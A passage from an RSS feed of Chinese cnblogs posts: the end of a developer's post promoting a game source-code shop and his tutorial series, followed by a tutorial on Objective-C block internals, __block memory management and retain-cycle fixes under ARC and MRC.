&lt;p&gt;与金主商量，可以将同类型的游戏交给某一个人完成，保持代码风格一致，更利于长期的合作&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235133588-1620397351.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;小峰的职业不是程序，做游戏是他的副业，他每次都觉得工作量不饱和，要求加量&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235133861-1330655676.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;金主也是程序员，他会检验大家的代码质量，通过通过金主的认可获得更多的任务，毕竟还有500个左右的游戏要做&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235134188-65718046.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;不论是开发者们、金主、还有晓衡，目前都合作的非常愉快，做让大家受益的事情，非常来劲！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235134517-1821816170.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;像流水帐一样写了这么多，晓衡也在不断梳理这段时间的经历，希望能将有益于大家的事件能长期做下去。&lt;/p&gt;
&lt;p&gt;需要寻找到更多的合作伙伴，我以个人开发者的角度，简单整理了一个思维导图，&lt;/p&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;游戏开发公众号：Creator 星球游戏开发社区&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;源码商店：晓衡在线源码商店&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;体验小程序：精选小程序&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;社群媒体：游戏联盟社群&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235134762-1710701254.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;公众号模块&lt;/strong&gt;：以游戏开发技术文章、教程为主，帮助新手入行，熟手精进，一起学习技术，探索个人开发者如何上线游戏挣得副业收，同时也是游戏源码商店的主要入口，以及开发者展示自己作品、能力的地方，看下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235134986-1840476147.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;源码商店模块：开发者游戏作品、技术知识变现的主要场所，晓衡总结了这20多天情况不断优化销售方式，分析了源码商店的客户群体，以下总结&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235135223-244785852.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;体验小程序模块：持续优化开发者的游戏作品、开发教程等的试玩+购买+教程的体验，并有效利用目前源码商店流量，将用户引导到小程序中。&lt;/p&gt;
&lt;p&gt;三位一体的一站式小程序，因为目前各种条件限制，不排斥以后各大应用商城会出现我们的&lt;strong&gt;源码精选 App 应用。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235135493-468852515.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;社群媒体模块：从微信群、QQ 群联合更多的开发者，并将他们的游戏作品，以视频教程的方式发布到各大自媒体平台，同时也为公众号、源码商店引导流量。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235135798-1232655383.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;开发者的一个游戏作品，除了自己上&lt;strong&gt;微信&lt;/strong&gt;、&lt;strong&gt;字节跳动&lt;/strong&gt;，还有像 &lt;strong&gt;VIVO&lt;/strong&gt;、&lt;strong&gt;OPPO&lt;/strong&gt;、&lt;strong&gt;百度&lt;/strong&gt;、&lt;strong&gt;UC&lt;/strong&gt;、&lt;strong&gt;趣头条&lt;/strong&gt;等平台。&lt;br/&gt;还可以将游戏源码上架到我们的源码商店，并提供文档教程形成像这样一个闭环&lt;strong&gt;公众号学习资料****-&amp;gt;&lt;/strong&gt;&lt;strong&gt;上架游戏平台&lt;/strong&gt;-&amp;gt;&lt;strong&gt;&lt;strong&gt;出售源码&lt;/strong&gt;&lt;/strong&gt;-&amp;gt;&lt;strong&gt;&lt;strong&gt;教程源码&lt;/strong&gt;&lt;/strong&gt;-&amp;gt;&lt;strong&gt;&lt;strong&gt;社群传播&lt;/strong&gt;&lt;/strong&gt;-&amp;gt;&lt;strong&gt;&lt;strong&gt;公众号新的学习资源&lt;/strong&gt;&lt;/strong&gt;助力个人开发者&lt;/p&gt;
&lt;p&gt;“一个游戏多分收益，出售的不仅仅是源码，还有知识和经验，还有开发者自己的个人品牌”，成为一个游戏开发界的“得到”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235136125-485068526.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;今天写的内容比较多，感谢大家耐心看到这里，个人游戏开发者**“绝地求生”**的游戏现在才开始！我整理了一下目前晓衡公众号的教程资源，目前还比较粗略，后面我会将图文类的文章教程整理成 PDF 方便大家查看学习。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CreatorPrimer 教程30篇&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235136419-253051027.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;公众号原创文章导航&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235136691-228939481.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235137292-656341332.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235137871-105786697.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235138285-1259111357.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GLSL系列&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235138600-288839632.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;晓衡的Creator开源框架系列&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235138839-527993025.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235139128-13426209.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235139380-1866485091.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235139892-1245168656.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235140265-748033265.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;零基础入视频教程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235140555-1959604280.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;实战微信小游戏《球球要回家大冒险》视频教程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235140870-1383671374.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;微店精品小游戏源码演示视频&amp;amp;关键技术分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235141175-968939896.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;晓衡在线*源码精讲系列视频教程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235141467-269075915.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后，感谢大家的支持&lt;strong&gt;求转发&lt;/strong&gt;，&lt;strong&gt;求在看&lt;/strong&gt;！晓衡在线等你们一起来！&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235141799-1107544749.jpg&quot; alt=&quot;image&quot;/&gt; 一个游戏多份收益，助力开发者&lt;strong&gt;技术精进&lt;/strong&gt;、&lt;strong&gt;副业变现，&lt;/strong&gt;我是&lt;strong&gt;工程师经纪人&lt;/strong&gt;张晓衡，欢迎加我微信！&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235141956-1398022732.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235142202-1611875852.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;4.1509433962264&quot;&gt;
&lt;p&gt;本文由博客一文多发平台 &lt;a href=&quot;https://openwrite.cn?from=article_bottom&quot;&gt;OpenWrite&lt;/a&gt; 发布！&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Wed, 25 Mar 2020 15:52:00 +0000</pubDate>
<dc:creator>张晓衡</dc:creator>
<og:description>​“ 一个游戏多份收益，助力开发者技术精进，副业挣钱 ” 晓衡经过了两年多的全职亲身实践与探索，在2020年3月开发终于开始盈利了！ 这是收到腾讯的2月的结算单，下图是2月1~2月15日的结算情况 5</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/creator-star/p/12571656.html</dc:identifier>
</item>
<item>
<title>Block详解二(底层分析) - 国孩</title>
<link>http://www.cnblogs.com/guohai-stronger/p/12518714.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/guohai-stronger/p/12518714.html</guid>
<description>&lt;p&gt;Block专辑:&lt;/p&gt;
&lt;p&gt;&lt;a class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/guohai-stronger/p/8203616.html&quot;&gt;Block讲解一&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a id=&quot;cb_post_title_url&quot; class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/guohai-stronger/p/9492155.html&quot;&gt;MRC-block与ARC-block&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/guohai-stronger/p/12439357.html&quot;&gt;Block详解一(底层分析)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今天讲述Block的最后一篇,后两篇仅仅是加深1,2篇的理解,废话少说,开始讲解!&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;__block细节&lt;/li&gt;
&lt;li&gt;__block内存管理&lt;/li&gt;
&lt;li&gt;循环引用问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;一：__block细节&lt;/h3&gt;
&lt;p&gt;大家可能会遇到下面的问题,block的内部想要修改外部的auto变量,但是编译器会报问题!如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1305302/202003/1305302-20200320113355846-766608734.jpg&quot; alt=&quot;&quot; width=&quot;583&quot; height=&quot;190&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果block内部想要修改外部的auto变量,可以在int age 前面加入static修饰词,变为静态局部变量(会一直存在内存中,反而不好),以及可以将int age代码移植到函数外面变为全局变量! 除此之外还有没有其他的做法了呢,显然是有的,通过__block修饰,如下:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1305302/202003/1305302-20200320141719722-1945405854.png&quot; alt=&quot;&quot; width=&quot;583&quot; height=&quot;283&quot;/&gt;&lt;/p&gt;
&lt;p&gt;发现__block修改外面变量是可以达到目的的! 小结论&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;&lt;strong&gt;__block可以用于解决block内部无法修饰auto变量值的问题&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;strong&gt;__block不能修饰全局变量、静态变量(static)&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;strong&gt;编译器会将__block变量包装成一个对象&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;通过命令&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
xcrun -sdk iphoneos clang -arch arm64 -rewrite-objc main.m
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;生成main.cpp代码查看原理&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1305302/202003/1305302-20200320154558182-1652376691.jpg&quot; alt=&quot;&quot; width=&quot;620&quot; height=&quot;373&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面提到可以将int main函数的代码简化一下,简化成如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1305302/202003/1305302-20200320173212469-977129178.jpg&quot; alt=&quot;&quot; width=&quot;613&quot; height=&quot;262&quot;/&gt;&lt;/p&gt;
&lt;p&gt;首先拿到forwarding指针然后再拿到age的值&lt;/p&gt;

&lt;h3&gt;二：__block的内存管理&lt;/h3&gt;
&lt;h4&gt;1. 当block在栈上时，并不会对__block变量产生强引用；&lt;/h4&gt;
&lt;h4&gt;2. 当block被copy到堆时&lt;/h4&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;会调用block内部的copy函数&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;copy函数内部调用_Block_object_assign函数&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;_Block_object_assign函数会对__block变量形成强引用（retain）&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1305302/202003/1305302-20200323231940247-1499026731.png&quot; alt=&quot;&quot; width=&quot;602&quot; height=&quot;158&quot;/&gt;&lt;/p&gt;
&lt;h4&gt; 3.当block从堆中移除时&lt;/h4&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;会调用block内部的dispose函数&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dispose函数内部会调用_Block_object_dispose函数&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;_Block_object_dispose函数会自动释放引用的__block变量（release）&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1305302/202003/1305302-20200323232422868-488587790.png&quot; alt=&quot;&quot; width=&quot;602&quot; height=&quot;156&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;拓展：__block的_forwarding指针&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1305302/202003/1305302-20200324225254229-1512598316.png&quot; alt=&quot;&quot; width=&quot;512&quot; height=&quot;298&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 栈上block的forwarding指针指向堆上的block，而堆上block的forwarding指针指向自己本身的指针。&lt;/p&gt;
&lt;h3&gt; 三：循环引用&lt;/h3&gt;
&lt;p&gt; 关于block循环引用的基本概念，专辑block已经讲解，本篇讲述核心内容&lt;/p&gt;
&lt;h4&gt;1. 解决循环引用问题-ARC&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;(1) 用__weak、__unsafe_unretained解决&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1305302/202003/1305302-20200325215458854-520869336.png&quot; alt=&quot;&quot; width=&quot;566&quot; height=&quot;165&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 下面用例子来巩固下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;int&lt;/span&gt; main(&lt;span&gt;int&lt;/span&gt; argc, &lt;span&gt;const&lt;/span&gt; &lt;span&gt;char&lt;/span&gt; *&lt;span&gt; argv[]) {
    @autoreleasepool {
        Person &lt;/span&gt;*person =&lt;span&gt; [[Person alloc]init];
        __weak Person &lt;/span&gt;*weakPerson =&lt;span&gt; person;
        person.block &lt;/span&gt;= ^&lt;span&gt;{
            NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;age is %d&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, weakPerson.age);
        };
    }
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;1111111&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;#import&lt;/span&gt; &amp;lt;Foundation/Foundation.h&amp;gt;&lt;span&gt;
NS_ASSUME_NONNULL_BEGIN&lt;br/&gt;typedef &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;(^ZXYBlock)(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;);&lt;br/&gt;&lt;/span&gt;&lt;span&gt;@interface&lt;/span&gt;&lt;span&gt; Person : NSObject&lt;br/&gt;@property(nonatomic,copy)ZXYBlock block;
@property(assign, nonatomic)&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; age;
&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;

&lt;span&gt;#import&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Person.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; Person
&lt;/span&gt;-(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)dealloc {
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;%s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, __func__);
}
&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;__weak方式解决循环引用问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1305302/202003/1305302-20200325221432962-353660735.jpg&quot; alt=&quot;&quot; width=&quot;572&quot; height=&quot;267&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;__unsafe_unretained方式解决循环引用问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1305302/202003/1305302-20200325222018336-1637852531.png&quot; alt=&quot;&quot; width=&quot;561&quot; height=&quot;269&quot;/&gt;&lt;/p&gt;
&lt;p&gt; __weak，__unsafe_unretained都可以解决循环引用，有什么区别呢？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;结论&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;相同点：__weak和__unsafe_unretained都不会产生强引用&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;不同点：__weak指向对象销毁时，会自动让指针置为nil；__unsafe_unretained不安全，指向对象销毁时，指针存储地址         不变，如果再次访问可能会造成野指针&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;(2) 用__block方式解决&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1305302/202003/1305302-20200325223423682-930989595.png&quot; alt=&quot;&quot; width=&quot;561&quot; height=&quot;227&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面来探究一下为什么__block可以解决循环引用？看下编译成的c++代码&lt;/p&gt;
&lt;p&gt;以前结合__block 对象变量以及__block自动变量可知：c++包含了三个对象，如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1305302/202003/1305302-20200325224731990-1809892615.png&quot; alt=&quot;&quot; width=&quot;553&quot; height=&quot;397&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 上面的三种关系如下，调用person = nil就是为了打断其中一个循环引用链条，但是必须要调用block()&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1305302/202003/1305302-20200325225003657-1121039069.png&quot; alt=&quot;&quot; width=&quot;553&quot; height=&quot;93&quot;/&gt;&lt;/p&gt;
&lt;h4&gt;2. 解决循环引用问题-MRC&lt;/h4&gt;
&lt;p&gt;MRC下，首先要在编译器上设置为MRC环境。Build Settings-&amp;gt;Automatic Reference Counting设为No&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1305302/202003/1305302-20200325225840199-1924899437.png&quot; alt=&quot;&quot; width=&quot;555&quot; height=&quot;160&quot;/&gt;&lt;/p&gt;
&lt;p&gt;(1) 用__unsafe_unretained解决&lt;/p&gt;
&lt;p&gt;因为MRC下不存在弱指针，所以不存在__weak修饰解决循环引用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1305302/202003/1305302-20200325230622573-740932298.png&quot; alt=&quot;&quot; width=&quot;556&quot; height=&quot;233&quot;/&gt;&lt;/p&gt;
&lt;p&gt;(2) 用__block解决&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1305302/202003/1305302-20200325231119742-1831252050.png&quot; alt=&quot;&quot; width=&quot;550&quot; height=&quot;253&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;总结&lt;/h3&gt;
&lt;p&gt;上面是block最后一篇的讲解，关于block总共有四篇博客，应该可以讲解完所有关于block的内容，应该会大大增加大家对block底层的理解，如果觉得有意义有所帮助，欢迎点赞和关注，本人会及时更新博客！！！&lt;/p&gt;

</description>
<pubDate>Wed, 25 Mar 2020 15:16:00 +0000</pubDate>
<dc:creator>国孩</dc:creator>
<og:description>Block专辑: Block讲解一 MRC-block与ARC-block Block详解一(底层分析) 今天讲述Block的最后一篇,后两篇仅仅是加深1,2篇的理解,废话少说,开始讲解! __blo</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/guohai-stronger/p/12518714.html</dc:identifier>
</item>
</channel>
</rss>